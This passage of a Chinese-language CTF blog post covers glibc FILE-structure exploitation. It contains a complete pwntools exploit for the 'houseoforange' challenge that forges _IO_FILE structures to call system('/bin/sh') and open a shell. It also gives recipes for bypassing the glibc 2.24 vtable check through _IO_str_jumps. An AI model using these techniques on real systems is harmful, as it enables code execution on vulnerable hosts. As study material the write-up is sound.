class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;./houseoforange&apos;)</span><br><span class="line">elf = ELF(&apos;./houseoforange&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;./houseoforange&apos;)</span><br><span class="line">#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line">def build(size,name,price,color):</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(&quot;1&quot;)</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.send(name)</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(str(price))</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def see():</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(&quot;2&quot;)</span><br><span class="line"></span><br><span class="line">def upgrade(size,name,price,color):</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(&quot;3&quot;)</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.send(name)</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(str(price))</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">build(0x20,&apos;1&apos;,20,1)</span><br><span class="line">pay = &apos;a&apos;*0x20+p64(0)+p64(0x21)+&apos;b&apos;*0x10+p64(0)+p64(0xf91)</span><br><span class="line">upgrade(len(pay),pay,20,1)</span><br><span class="line"></span><br><span class="line">#trigger _sys_malloc</span><br><span class="line">build(0x1000,&apos;2&apos;,20,2)</span><br><span class="line"></span><br><span class="line">build(0x400,&apos;3&apos;*8,20,3)</span><br><span class="line">see()</span><br><span class="line">sh.recvuntil(&apos;3&apos;*8)</span><br><span class="line">libc.base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\0&apos;))-0x3c5188</span><br><span class="line">print hex(libc.base)</span><br><span class="line">io_list_all = libc.base + libc.symbols[&apos;_IO_list_all&apos;]</span><br><span class="line">print hex(io_list_all)</span><br><span class="line">system = libc.base + libc.symbols[&apos;system&apos;]</span><br><span class="line">print hex(system)</span><br><span class="line"></span><br><span class="line">upgrade(0x400,&apos;4&apos;*16,20,4)</span><br><span class="line">see()</span><br><span class="line">sh.recvuntil(&apos;4&apos;*16)</span><br><span class="line">heap_base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\0&apos;))-0xd0</span><br><span class="line">print hex(heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = &apos;e&apos;*0x400</span><br><span class="line">pay += p64(0)+p64(0x21)+p32(1)+p32(0x14)+p64(0)</span><br><span class="line"></span><br><span class="line"># mode &gt;0 &amp;&amp; wide_data-&gt;write_ptr &gt; wide_data-&gt;write_base &amp;&amp; vtable_offset == 0</span><br><span class="line">fake_file = &apos;/bin/sh\x00&apos;+p64(0x61)</span><br><span class="line">fake_file += p64(0xdeadbeef) + p64(io_list_all-0x10) #unsorted bin attack</span><br><span class="line">fake_file = fake_file.ljust(0xa0,&apos;\x00&apos;)</span><br><span class="line">fake_file += p64(heap_base+0x4e0)  #wide_data</span><br><span class="line">fake_file = fake_file.ljust(0xc0,&apos;\x00&apos;)</span><br><span class="line">fake_file += p64(1)  # mode</span><br><span class="line"></span><br><span class="line"># write_base &lt; write_ptr &amp;&amp; mode &lt;=0    </span><br><span class="line">fake_file2 = &apos;/bin/sh\x00&apos;+p64(0x61)</span><br><span class="line">fake_file2 += p64(0xdeadbeef) + p64(io_list_all-0x10)</span><br><span class="line">fake_file2 += p64(0) + p64(1)  # write_base &amp; write_ptr</span><br><span class="line">fake_file2 = fake_file2.ljust(0xc0,&apos;\x00&apos;)</span><br><span class="line">fake_file2 += p64(0)  # mode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay += fake_file         # fake_file &amp; fake_file2 对应着两种绕过检查</span><br><span class="line">pay += p64(0) + p64(0)  </span><br><span class="line">pay += p64(heap_base+0x610) #vtable</span><br><span class="line"></span><br><span class="line">pay += p64(0)*2+p64(system)*10</span><br><span class="line"></span><br><span class="line">upgrade(0x800,pay,20,5)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><ul><li><p>mode &gt;0 &amp;&amp; wide_data-&gt;write_ptr &gt; wide_data-&gt;write_base &amp;&amp; vtable_offset == 0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&gt; p *(struct _IO_FILE_plus *) 0x55b527f0b500</span><br><span class="line">$2 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175, </span><br><span class="line">    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, </span><br><span class="line">    _IO_read_end = 0xdeadbeef &lt;error: Cannot access memory at address 0xdeadbeef&gt;, </span><br><span class="line">    _IO_read_base = 0x7fa084964510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x0, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x55b527f0b4e0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 1, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x55b527f0b610</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>write_base &lt; write_ptr &amp;&amp; mode &lt;=0    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&gt; p *(struct _IO_FILE_plus *) 0x55731d86f500 </span><br><span class="line">$1 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175, </span><br><span class="line">    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, </span><br><span class="line">    _IO_read_end = 0xdeadbeef &lt;error: Cannot access memory at address 0xdeadbeef&gt;, </span><br><span class="line">    _IO_read_base = 0x7fbcf865f510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x55731d86f610</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="2-24-check-绕过"><a href="#2-24-check-绕过" class="headerlink" title="2.24 check 绕过"></a>2.24 check 绕过</h1><p>前面已经知道从2.24开始添加了对虚表的检查，使得没有办法任意地址伪造vtable。所以有了一些不用伪造虚表的利用办法</p><h2 id="IO-buf-base-amp-IO-buf-end"><a href="#IO-buf-base-amp-IO-buf-end" class="headerlink" title="_IO_buf_base &amp; _IO_buf_end"></a>_IO_buf_base &amp; _IO_buf_end</h2><p>再调用相关stdin的函数如——read , scanf等函数时，会对__IO_stdin 的 _IO_buf_base ,_IO_buf_end, _IO_read_ptr, _IO_read_base, _IO_read_end 进行初始化，因为底层调用的malloc，所以一般都会分配到堆里。</p><p>可以随便写个小程序测试下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">char *ptr = malloc(0x20);</span><br><span class="line">int a;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;a);</span><br><span class="line">printf(&quot;%d&quot;,a);</span><br><span class="line">free(ptr);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>加上调试符号编译，scanf过后，可以看到堆中添加了一个大小为0x411的chunk，这个chunk就是开辟的缓冲区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 49, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602030 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 1041, </span><br><span class="line">  fd = 0xa363534333231, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602440 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 134081, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; p *(struct _IO_FILE_plus *) stdin</span><br><span class="line">$3 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539512, </span><br><span class="line">    _IO_read_ptr = 0x602046 &quot;\n&quot;, </span><br><span class="line">    _IO_read_end = 0x602047 &quot;&quot;, </span><br><span class="line">    _IO_read_base = 0x602040 &quot;123456\n&quot;, </span><br><span class="line">    _IO_write_base = 0x602040 &quot;123456\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x602040 &quot;123456\n&quot;, </span><br><span class="line">    _IO_write_end = 0x602040 &quot;123456\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x602040 &quot;123456\n&quot;, </span><br><span class="line">    _IO_buf_end = 0x602440 &quot;&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = -1, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x7ffff7dd7770 &lt;_IO_stdfile_0_lock&gt;, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7ffff7dd59a0 &lt;_IO_wide_data_0&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd2440 &lt;__GI__IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如我们在使用scanf对栈中的临时变量赋值时，作为缓冲区，数据也会在这边被同步保存，因而如果能够控制_IO_buf_base指针，就能够实现任意地址写。</p><p>同理printf等也会开辟输出缓冲区，通过修改也能够做到任意地址读。</p><h2 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="_IO_str_jumps"></a>_IO_str_jumps</h2><p>libc不止有_IO_file_jumps这个虚表，还有_IO_str_jumps 与 _IO_wstr_jumps等虚表，一般前者更好利用<br>所以将伪造的结构体vtable指针指向这个虚表，再对其进行利用</p><p>_IO_str_jumps 定义于/libio/strops.c中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">const struct _IO_jump_t _IO_str_jumps libio_vtable =</span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>一般可以利用_IO_str_finish 与 _IO_str_overflow，同时也是前者更方便利用，定义如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_str_finish (FILE *fp, int dummy)</span><br><span class="line">&#123;</span><br><span class="line">  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); # call qword ptr [fp+0E8h]</span><br><span class="line">  fp-&gt;_IO_buf_base = NULL;</span><br><span class="line">  _IO_default_finish (fp, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_str_finish需要满足<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_flags = (binsh_in_libc + 0x10) &amp; ~1</span><br><span class="line">_IO_buf_base = binsh_addr</span><br><span class="line">_freeres_list = 0x2</span><br><span class="line">_freeres_buf = 0x3</span><br><span class="line">_mode = -1</span><br><span class="line">vtable = _IO_str_finish - 0x18</span><br><span class="line">fp+0xe8 -&gt; system_addr</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_str_overflow (FILE *fp, int c)</span><br><span class="line">&#123;</span><br><span class="line">  int flush_only = c == EOF;</span><br><span class="line">  size_t pos;</span><br><span class="line">  if (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      return flush_only ? 0 : EOF;</span><br><span class="line">  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */         // step 1</span><br><span class="line">return EOF;</span><br><span class="line">      else</span><br><span class="line">&#123;</span><br><span class="line">  char *new_buf;</span><br><span class="line">  char *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">  size_t old_blen = _IO_blen (fp);</span><br><span class="line">  size_t new_size = 2 * old_blen + 100;</span><br><span class="line">  if (new_size &lt; old_blen)</span><br><span class="line">    return EOF;</span><br><span class="line">  new_buf = malloc (new_size);</span><br><span class="line">  if (new_buf == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      /*  __ferror(fp) = 1; */</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  if (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      memcpy (new_buf, old_buf, old_blen);</span><br><span class="line">      free (old_buf);</span><br><span class="line">      /* Make sure _IO_setb won&apos;t try to delete _IO_buf_base. */</span><br><span class="line">      fp-&gt;_IO_buf_base = NULL;</span><br><span class="line">    &#125;</span><br><span class="line">  memset (new_buf + old_blen, &apos;\0&apos;, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">  _IO_setb (fp, new_buf, new_buf + new_size, 1);</span><br><span class="line">  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  if (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;</span><br><span class="line">  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  return c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><p>_IO_str_overflow需要满足<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_flags = 0</span><br><span class="line">_IO_write_base = 0</span><br><span class="line">_IO_write_ptr = (binsh_in_libc_addr -100) / 2 +1</span><br><span class="line">_IO_buf_end = (binsh_in_libc_addr -100) / 2 </span><br><span class="line">_freeres_list = 0x2</span><br><span class="line">_freeres_buf = 0x3</span><br><span class="line">_mode = -1</span><br><span class="line">vtable = _IO_str_jumps - 0x18</span><br></pre></td></tr></table></figure></p><h1 id="利用实例2"><a href="#利用实例2" class="headerlink" title="利用实例2"></a>利用实例2</h1><h2 id="echo-from-your-heart"><a href="#echo-from-your-heart" class="headerlink" title="echo from your heart"></a>echo from your heart</h2><h2 id="方向-2"><a href="#方向-2" class="headerlink" title="方向"></a>方向</h2><p>有点迷/尝试使用的fake_file2也没有成功，在unlink的时候就中断了。</p><p>_flags = 0<br>_IO_write_base &lt; _IO_write_ptr<br>_IO_buf_base = binsh<br>_mode &lt;= 0<br>vtable = _IO_str_jumps - 8<br>fp+0xe8 -&gt; system_addr</p><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>基本上就是那个hctf中的printf，程序执行流基本一致</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 